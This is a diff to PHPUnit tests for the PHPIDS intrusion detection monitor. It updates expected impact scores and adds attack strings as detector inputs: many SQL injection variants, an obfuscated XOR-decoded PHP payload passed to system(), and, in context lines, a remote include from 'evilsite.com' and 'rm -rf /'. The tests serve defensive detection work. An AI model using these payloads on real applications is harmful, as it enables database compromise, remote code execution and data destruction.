@@ -457,7 +457,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(264, $result->getImpact());        
+        $this->assertEquals(278, $result->getImpact());        
     }
 
     public function testSQLIList2() {
@@ -500,7 +500,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(328, $result->getImpact());        
+        $this->assertEquals(321, $result->getImpact());        
     }
 
     public function testSQLIList3() {
@@ -544,7 +544,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(249, $result->getImpact());        
+        $this->assertEquals(319, $result->getImpact());        
     }    
 
     public function testSQLIList4() {
@@ -569,20 +569,32 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "a'IS NOT NULL or+1=+'1";
         $exploits[] = "aa'in('aa') or-1!='0";
         $exploits[] = "aa' or column=+!1 #1";
-        $exploits[] = "aa' or column=+!1 #1";
         $exploits[] = "aa' SOUNDS like+'1";
         $exploits[] = "aa' REGEXP+'0";
         $exploits[] = "aa' like+'0";
         $exploits[] = "-1'=-'+1";
         $exploits[] = "'=+'";
-        
+        $exploits[] = "aa' or stringcolumn= +!1 #1 "; 
+		$exploits[] = "aa' or anycolumn ^ -'1";  
+		$exploits[] = "aa' or intcolumn && '1";  
+		$exploits[] = "asd' or column&&'1";
+		$exploits[] = "asd' or column= !1 and+1='1";
+		$exploits[] = "aa' or column=+!1 #1";
+		$exploits[] = "aa'IS NOT NULL or+1^+'0";
+		$exploits[] = "aa'IS NOT NULL or +1-1 xor'0";
+		$exploits[] = "aa'IS NOT NULL or+2-1-1-1 !='0";
+		$exploits[] = "aa'|1+1=(2)Or(1)='1";
+		$exploits[] = "aa'|3!='4";
+		$exploits[] = "aa'|ascii(1)+1!='1";
+		$exploits[] = "aa'|LOCALTIME*0!='1 ";
+
         $test = new IDS_Monitor(
             $exploits,
             $this->init
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(224, $result->getImpact());        
+        $this->assertEquals(306, $result->getImpact());        
     }     
     
     public function testDTList(){
@@ -640,6 +652,10 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = '; include "http://evilsite.com/evilcode"';
         $exploits[] = '; rm -rf /\0';
         $exploits[] = '"; $_a=(! \'a\') . "php"; $_a.=(! \'a\') . "info"; $_a(1); $b="';
+        $exploits[] = '"; 
+						define ( _a, "0008avwga000934mm40re8n5n3aahgqvaga0a303") ;
+						if  ( !0) $c = USXWATKXACICMVYEIkw71cLTLnHZHXOTAYADOCXC ^ _a;
+						if  ( !0) system($c) ;//';
         
         $test = new IDS_Monitor(
             $exploits,
